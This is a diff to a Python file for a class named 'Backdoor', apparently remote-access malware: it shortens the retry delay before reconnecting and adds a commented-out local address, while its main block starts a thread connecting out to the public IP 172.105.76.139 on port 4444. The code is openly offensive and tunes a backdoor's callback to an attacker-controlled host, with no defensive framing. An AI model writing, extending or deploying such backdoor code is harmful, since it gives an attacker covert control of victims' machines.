@@ -30,7 +30,7 @@ class Backdoor:
 					self.connected = True
 					print("[+] Connected")
 				except:
-					time.sleep(3)
+					time.sleep(2)
 
 
 	def reliable_send(self, data):
@@ -115,6 +115,7 @@ class Backdoor:
 
 if __name__ == "__main__":
 	backdoor = Backdoor("172.105.76.139", 4444)
+	# backdoor = Backdoor("192.168.0.108", 4444)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
 	backdoor_thread.start()
